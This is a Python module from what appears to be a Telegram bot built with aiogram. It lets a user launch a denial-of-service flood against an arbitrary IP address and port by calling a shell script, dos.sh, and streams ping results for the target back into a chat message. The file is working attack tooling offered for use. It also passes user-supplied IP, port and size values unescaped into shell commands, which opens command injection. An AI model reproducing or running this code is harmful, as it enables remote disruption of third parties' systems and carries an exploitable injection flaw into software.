import asyncio
import logging
import os.path

from aiogram.dispatcher.storage import FSMContextProxy
from aiogram.types import Message

from loader import dp


async def get_timeout():
    await asyncio.sleep(600)


async def get_ping(message: Message, dos_data: FSMContextProxy):
    current_path = os.path.dirname(os.path.abspath(__file__))
    msg = await message.answer(f"Текущее состояние пакетов по данному IP-адресу:")
    while await dp.current_state().get_state() != 'DosState:stopped_script':
        cmd = f"sh '{current_path}/ping.sh' {dos_data['ip']}"
        proc = await asyncio.create_subprocess_shell(
            cmd=cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        await msg.edit_text(f"Текущее состояние пакетов по данному IP-адресу:\n{stdout.decode()}")


async def start_dos(dos_data: FSMContextProxy):
    current_path = os.path.dirname(os.path.abspath(__file__))
    cmd = f"sh '{current_path}/dos.sh' {current_path}/dos_lib {dos_data['ip']} {dos_data['port']} {dos_data['size']}"
    proc = await asyncio.create_subprocess_shell(
        cmd=cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await proc.communicate()
    logging.info(f'[{cmd!r} exited with {proc.returncode}]')
    if stdout:
        logging.info(f'[stdout]\n{stdout.decode()}')
    if stderr:
        logging.info(f'[stderr]\n{stderr.decode()}')
